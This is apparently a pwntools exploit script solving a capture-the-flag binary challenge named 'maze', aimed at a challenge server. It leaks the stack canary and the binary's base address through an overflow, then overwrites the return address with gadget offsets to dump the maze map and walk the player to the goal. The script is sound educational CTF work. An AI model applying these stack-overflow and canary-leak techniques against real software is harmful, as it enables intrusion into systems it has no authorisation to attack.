from pwn import *

context.terminal = ["kitty"]
script = """
set breakpoint pending on
b __stack_chk_fail
c
"""

if args.REMOTE:
    p = remote("chall.pwnoh.io", 13387)
elif args.GDB:
    p = gdb.debug(["./maze", "FLAGLDSF:JA:LKFJAODSIUEWR#$@(#@)*$)(#FLAGFLAGFLAGFLAGFLAGFLAG)"], gdbscript=script)
else:
    p = process(["./maze", "FLAGLDSF:JA:LKFJAODSIUEWR#$@(#@)*$)(#FLAGFLAGFLAGFLAGFLAGFLAG)"])

# input starts at rbp - 13
# canary starts at rbp - 8

payload = b"A" * 6
p.sendline(payload)
p.recvuntil(payload)
leak = p.recvline(keepends=False)
canary = b"\x00" + leak[:7]
base = u64(leak[7:].ljust(8, b"\x00"))
log.info(f"leak: {leak}")
log.info(f"canary: {u64(canary):x}")
log.info(f"base: 0x{base:x}")

payload = b"A" * 21
p.sendline(payload)
p.recvuntil(payload)
leak = p.recvline(keepends=False)
retaddr = u64(leak[:8].ljust(8, b"\x00"))
filebase = retaddr - 0x3431
ret = filebase + 0x3459
log.info(f"leak: {leak}")
log.info(f"retaddr: 0x{retaddr:x}")
log.info(f"filebase: {filebase:x}")

dump = b"A" * 4 + canary + p64(0) + p64(filebase + 0x2a44) + p64(filebase + 0x2f7a)
payload = b"A" * 4 + canary + p64(0) + p64(filebase + 0x342c) #p64(filebase + 0x342c)
payload = payload.ljust(0x24)
print(payload)

right = True
def stop(s):
    return any([test in s for test in [b"everything is light", b"it is crushing", b"intense heat", b"slurp", b"ribbity!", b"the frog..."]])

pos = p.recvuntil(b")", drop=True)
pos = pos[pos.rindex(b"(")+1:]
x, y = map(int, pos.split(b","))

# try:
log.info(f"locating return gadget...")
done = False
for i in range(400-y):
    p.send(b"s" + payload)
    pos = p.recvuntil(b")\n", drop=True)
    if stop(pos): break
    for i in range(400):
        p.send(b"a" + payload)
        if stop(p.recvuntil(b")\n")): done=True; break
    if done: break
    p.send(b"s" + payload)
    if stop(p.recvuntil(b")\n")): break
    for i in range(400):
        p.send(b"d" + payload)
        if stop(p.recvuntil(b")\n")): done=True; break
    if done: break

log.info(f"dumping map...")
p.sendline(b"s")
first = p.recvuntil(b")\n")
open("first.txt", "w+").write(first.decode())

p.send(b"w" + dump)
p.recvuntil(b"\n")

board = p.recvuntil(b"(", drop=True)
open("map.txt", "w+").write(board.decode())
board = board.replace(b"\n", b"")
print(board)

px, py = map(int, p.recvuntil(b")", drop=True).split(b","))
lin = board.index(b"*")
fx, fy = lin % 400, lin // 400
log.info(f"px: {px}, py: {py}")
log.info(f"fx: {fx}, fy: {fy}")

for i in range(abs(fx-px)):
    p.send((b"d" if fx >= px else b"a") + payload)
for i in range(abs(fy-py)):
    p.send((b"s" if fy >= py else b"w") + payload)
p.interactive()

# except Exception as e:
#     log.info(f"Exception: {e}")
# finally:
#     p.interactive()